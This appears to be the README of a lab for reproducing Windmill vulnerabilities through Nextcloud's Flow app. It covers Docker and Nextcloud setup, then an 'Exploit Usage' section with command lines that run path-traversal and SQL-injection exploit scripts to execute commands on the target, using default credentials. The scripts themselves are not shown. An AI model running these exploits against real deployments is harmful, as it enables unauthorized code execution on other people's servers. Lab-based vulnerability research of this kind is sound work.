# Windfall - Nextcloud Flow Lab

Test environment for Windmill vulnerabilities via Nextcloud Flow.

## Prerequisites

Add to `/etc/hosts`:
```bash
sudo sh -c 'echo "127.0.0.1 localhost.local" >> /etc/hosts'
```

## Setup

```bash
docker compose up -d
```

## AIO Configuration

1. Open **https://localhost:8180** (accept self-signed certificate)
2. Note the generated passphrase
3. Enter domain: **`localhost.local`**
4. In **Optional containers**, check:
   - ☑️ **Docker Socket Proxy** (required for AppAPI/Flow)
5. Click **Submit** then **Start containers**
6. Wait for all containers to be "Running" (5-10 min)

## Access Nextcloud

- URL: **https://localhost.local**
- Username: `admin`
- Password: shown in AIO interface

## Install Flow

1. In Nextcloud → **Apps** → Search **"Flow"** → **Install**
2. Access: `https://localhost.local/index.php/apps/flow/`

## Exploit Usage

```bash
# Get Flow container IP
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nc_app_flow

# Path Traversal - Direct (from repo root)
cd ..
python3 windfall_afr.py http://<flow-ip>:8000 -c "id"

# Path Traversal - Via Nextcloud proxy
python3 windfall_afr.py https://localhost.local -u admin -p <nc_password> -c "id"

# SQLi - Direct
python3 windfall_sqli.py http://<flow-ip>:8000 -u operator@windmill.dev -p password123 -c "id"

# SQLi - Via proxy
python3 windfall_sqli.py https://localhost.local \
  --nc-user admin --nc-pass <nc_password> \
  -u operator@windmill.dev -p password123 -c "id"
```

## Scanner Limitations

| Access Method | Authentication | Scannable |
|---------------|----------------|-----------|
| Flow proxy    | ✅ Nextcloud auth required | ❌ Not without credentials |
| Direct port 8000 | ❌ No auth | ✅ If exposed (misconfiguration) |

## Files

- `docker-compose.yml` - Nextcloud AIO + nginx proxy
- `nginx/` - SSL proxy configuration
